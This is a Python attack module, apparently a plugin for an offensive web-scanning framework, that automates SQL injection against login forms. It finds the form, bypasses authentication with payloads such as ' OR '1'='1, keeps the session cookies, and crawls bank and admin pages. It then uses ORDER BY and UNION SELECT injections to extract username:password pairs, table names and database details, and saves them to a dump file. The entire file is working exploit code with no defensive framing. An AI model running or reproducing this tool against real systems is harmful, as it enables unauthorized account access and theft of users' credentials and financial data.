"""sqli_post_dump — dump data via POST login bypass + authenticated session"""
import re
from urllib.parse import urljoin, urlparse
from pathlib import Path
from core.http import HttpClient


BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "admin'--",
    "' OR 1=1--",
]


class SqliPostDump:
    def run(self, session, logger):
        target = session.target
        base_url = target.split("?")[0] if "?" in target else target
        http = HttpClient(session, logger)

        print(f"[sqli_post_dump] target: {base_url}")

        # 1. найти форму логина
        form = self._find_login_form(http, base_url)
        if not form:
            print("[sqli_post_dump] no login form found")
            return {}

        print(f"[sqli_post_dump] form: {form['action']} (fields: {form['user_field']}/{form['pass_field']})")

        # 2. bypass через SQLi
        url = urljoin(base_url, form["action"])
        session_cookies = None
        bypass_payload = None

        for payload in BYPASS_PAYLOADS:
            data = {form["user_field"]: "admin", form["pass_field"]: payload}
            r = http.post(url, data=data, allow_redirects=True)
            if r and self._is_logged_in(r):
                session_cookies = http.s.cookies.get_dict()
                bypass_payload = payload
                print(f"[sqli_post_dump] BYPASS via: {payload[:30]}")
                logger.finding("post_dump_bypass", "critical",
                               f"logged in with {payload[:40]}")
                break

        if not session_cookies:
            print("[sqli_post_dump] no bypass worked")
            return {}

        print(f"[sqli_post_dump] cookies: {list(session_cookies.keys())[:5]}")

        # 3. verify session — зайти на защищённую страницу
        verify_paths = ["/bank/main.jsp", "/admin", "/admin/admin.jsp", "/bank/account.jsp"]
        authenticated = False
        auth_page = None
        for vp in verify_paths:
            r = http.get(base_url.rstrip("/") + vp)
            if r and r.status_code == 200:
                low = r.text.lower()
                # признаки авторизованности
                if any(k in low for k in ["main.jsp", "my account", "sign out", "logout",
                                           "balance", "account summary", "hello admin"]):
                    authenticated = True
                    auth_page = vp
                    print(f"[sqli_post_dump] authenticated: {vp} ({len(r.content)}b)")
                    break

        if not authenticated:
            print(f"[sqli_post_dump] not authenticated — bypass worked but session lost")

        # 3. dump data from authenticated session
        out_dir = Path("reports") / "dump" / "sqli_post"
        out_dir.mkdir(parents=True, exist_ok=True)

        dumped = {}

        # 3.1. dump visible pages
        pages = ["/bank/main.jsp", "/admin/admin.jsp", "/bank/account.jsp",
                 "/bank/transaction.jsp", "/admin/users", "/dashboard"]
        for path in pages:
            r = http.get(base_url.rstrip("/") + path)
            if r and r.status_code == 200:
                # extract text (не HTML)
                text = re.sub(r'<script[^>]*>.*?</script>', '', r.text, flags=re.DOTALL)
                text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
                text = re.sub(r'<[^>]+>', ' ', text)
                text = re.sub(r'\s+', ' ', text).strip()
                if text:
                    dumped[path] = text[:2000]
                    print(f"  + {path}: {len(text)}b text")

        # 3.2. detect column count via ORDER BY
        print()
        print("[sqli_post_dump] detecting column count via ORDER BY")
        correct_cols = 0
        for n in range(1, 15):
            payload = f"' ORDER BY {n}-- -"
            data = {form["user_field"]: "admin", form["pass_field"]: payload}
            r = http.post(url, data=data, allow_redirects=True)
            if not r:
                break
            low = r.text.lower()
            # ORDER BY n успешно = нет SQL ошибки
            has_error = any(m in low for m in ["sql syntax", "order by", "unknown column",
                                                "invalid", "syntax error", "sqlstate"])
            if has_error:
                correct_cols = n - 1
                break
        if correct_cols == 0:
            # fallback: пробуем UNION с 1..10
            correct_cols = self._find_union_cols(http, url, form)
        print(f"[sqli_post_dump] columns: {correct_cols}")

        # 3.3. try to extract via union with correct column count
        print()
        print("[sqli_post_dump] extracting via union")
        for expr, label in [
            ("(SELECT GROUP_CONCAT(username||':'||password) FROM users)", "users"),
            ("(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)", "tables"),
            ("database()", "database"),
            ("user()", "user"),
            ("version()", "version"),
        ]:
            for n in [correct_cols] if correct_cols > 0 else range(1, 8):
                cols = ",".join([expr if i == 0 else "NULL" for i in range(n)])
                payload = f"' UNION SELECT {cols}-- -"
                data = {form["user_field"]: "admin", form["pass_field"]: payload}
                r = http.post(url, data=data, allow_redirects=True)
                if not r:
                    continue
                text = re.sub(r'<[^>]+>', ' ', r.text)
                # if something looks like data (colon, tables)
                if label == "users" and ":" in text and "@" not in text[:200]:
                    matches = re.findall(r"[a-zA-Z0-9_]+:[a-zA-Z0-9!@#$%^&*]{4,}", text)
                    if matches:
                        dumped[f"union_{label}"] = "\n".join(matches[:20])
                        print(f"  ✓ {label}: {len(matches)} entries")
                        logger.finding(f"post_dump_{label}", "critical",
                                       f"{len(matches)} entries via union")
                        break
                elif label in ("database", "user", "version") and len(text) > 50:
                    if text.strip() and len(text.strip()) < 500:
                        dumped[f"union_{label}"] = text[:200]
                        print(f"  ✓ {label}: {text[:100]}")
                        logger.finding(f"post_dump_{label}", "critical", text[:100])
                        break

        # 4. save report
        if dumped:
            out_file = out_dir / "dump.txt"
            out_file.write_text("\n\n".join(f"=== {k} ===\n{v}" for k, v in dumped.items()))
            print(f"\n[sqli_post_dump] saved {len(dumped)} items to {out_file}")
        else:
            print(f"\n[sqli_post_dump] nothing to dump")

        return {"bypass": bypass_payload, "dumped": list(dumped.keys())}

    def _find_login_form(self, http, base_url):
        """Найти форму логина."""
        paths = ["", "/login", "/login.jsp", "/admin", "/signin"]
        USER_FIELDS = ["uid", "username", "user", "email", "login", "uname"]
        PASS_FIELDS = ["passw", "password", "pass", "pwd"]

        for path in paths:
            url = base_url.rstrip("/") + path if path else base_url
            r = http.get(url)
            if not r or r.status_code != 200:
                continue

            for m in re.finditer(r'<form[^>]*>(.*?)</form>', r.text, re.I | re.S):
                form_html = m.group(0)
                action = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
                action = action.group(1) if action else url
                fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_html, re.I)
                fields = [f for f in fields if f.lower() not in ("submit", "btnsubmit")]

                uf = pf = None
                for f in fields:
                    low = f.lower()
                    if any(k in low for k in PASS_FIELDS): pf = f
                    elif any(k in low for k in USER_FIELDS): uf = f
                if uf and pf:
                    return {"action": action, "user_field": uf, "pass_field": pf}
        return None

    def _is_logged_in(self, response):
        loc = response.headers.get("Location", "")
        if loc and any(k in loc.lower() for k in ["main", "dashboard", "account", "bank"]):
            return True
        if loc and "login" in loc.lower():
            return False
        text = response.text.lower()[:3000]
        for m in ["logout", "sign out", "my account", "dashboard", "administrator"]:
            if m in text and "type=\"password\"" not in text:
                return True
        return False
